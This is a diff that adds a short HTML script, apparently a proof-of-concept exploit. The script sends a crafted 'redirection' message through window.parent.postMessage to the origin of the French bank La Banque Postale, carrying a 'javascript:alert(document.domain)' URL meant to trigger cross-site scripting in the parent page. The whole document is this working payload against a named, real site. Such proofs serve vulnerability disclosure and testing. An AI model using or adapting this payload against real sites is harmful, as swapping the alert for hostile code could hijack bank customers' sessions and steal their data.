@@ -1,0 +1,11 @@
+<script>
+window.parent.postMessage(
+    JSON.stringify({
+        "type": "redirection",
+        "message": {
+            "url": "javascript:alert(document.domain)"
+        }
+    }),
+    "https://www.labanquepostale.fr"  // targetOrigin
+);
+</script>
